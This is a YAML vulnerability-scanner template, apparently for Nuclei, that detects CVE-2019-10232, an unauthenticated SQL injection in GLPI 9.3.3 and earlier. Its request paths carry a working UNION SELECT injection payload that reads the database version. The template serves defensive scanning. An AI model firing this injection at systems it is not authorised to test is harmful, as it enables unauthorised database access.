id: CVE-2019-10232
info:
  author: RedTeamBrasil
  classification:
    cve-id: CVE-2019-10232
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: Teclib GLPI <= 9.3.3 exposes a script (/scripts/unlock_tasks.php) that
    incorrectly sanitizes user controlled data before using it in SQL queries. Thus,
    an attacker could abuse the affected feature to alter the semantic original SQL
    query and retrieve database records.
  name: Teclib GLPI <= 9.3.3 Unauthenticated SQL Injection
  reference:
  - https://www.synacktiv.com/ressources/advisories/GLPI_9.3.3_SQL_Injection.pdf
  - https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c
  - https://nvd.nist.gov/vuln/detail/CVE-2019-10232
  severity: critical
  tags: cve,cve2019,glpi,sqli,injection
requests:
- extractors:
  - part: body
    regex:
    - '[0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}-MariaDB'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - -MariaDB-
    - Start unlock script
  method: GET
  path:
  - '{{BaseURL}}/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1'
  - '{{BaseURL}}/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1'
  stop-at-first-match: true
